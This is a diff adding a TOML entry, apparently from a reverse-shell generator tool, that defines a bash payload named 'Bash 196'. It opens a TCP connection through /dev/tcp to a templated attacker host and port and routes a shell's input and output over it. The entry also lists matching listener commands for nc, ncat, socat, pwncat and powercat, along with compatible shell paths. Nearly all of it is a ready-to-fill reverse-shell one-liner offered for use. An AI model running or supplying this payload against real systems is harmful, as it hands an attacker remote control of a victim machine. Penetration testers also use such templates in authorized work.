@@ -1,0 +1,25 @@
+id = "bash_196"
+name = "Bash 196"
+os = "unix"
+type = "reverse"
+proto = "tcp"
+lang = "bash"
+description = "Uses file descriptor 196 to open a TCP connection to the specified host and port, then redirects IO through FD 196."
+
+payload = "exec 196<>/dev/tcp/{{LHOST}}/{{LPORT}}; {{SHELL}} <&196 >&196 2>&196"
+
+[listeners]
+nc = "nc -lvnp {{LPORT}}"
+nc_freebsd = "nc -lvn {{LPORT}}"
+busybox_nc = "busybox nc -lp {{LPORT}}"
+ncat = "ncat -lvnp {{LPORT}}"
+ncat_exe = "ncat.exe -lvnp {{LPORT}}"
+rlwrap_nc = "rlwrap -cAr nc -lvnp {{LPORT}}"
+rustcat = "rcat listen {{LPORT}}"
+pwncat = "python3 -m pwncat -lp {{LPORT}}"
+socat = "socat -d -d TCP-LISTEN:{{LPORT}} STDOUT"
+socat_tty = "socat -d -d file:`tty`,raw,echo=0 TCP-LISTEN:{{LPORT}}"
+powercat = "powercat -l -p {{LPORT}}"
+
+[shells]
+compatible = ["/usr/bin/env bash", "bash", "/bin/bash", "/usr/bin/bash", "/usr/local/bin/bash", "/opt/homebrew/bin/bash", "/opt/local/bin/bash", "/snap/bin/bash", "/usr/sbin/bash", "/sbin/bash", "env bash"]
